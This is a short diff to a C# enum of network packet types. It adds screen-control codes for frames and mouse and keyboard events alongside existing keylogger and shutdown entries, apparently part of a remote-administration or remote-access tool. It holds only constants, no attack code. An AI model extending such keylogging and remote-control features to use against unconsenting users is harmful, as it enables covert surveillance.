@@ -28,7 +28,15 @@ namespace Common.Enums
         KeyLoggerLangToggle = 105,
         //Action packet
         ShutdownActionResponse = 18,
-        ShutdownActionRequest = 19
+        ShutdownActionRequest = 19,
+        
+        //Screen Control packets
+        ScreenControlStart = 200,
+        ScreenControlStop = 201,
+        ScreenControlFrame = 202,
+        ScreenControlMouseEvent = 203,
+        ScreenControlKeyboardEvent = 204,
+        ScreenControlResponse = 205
     }
 }
 
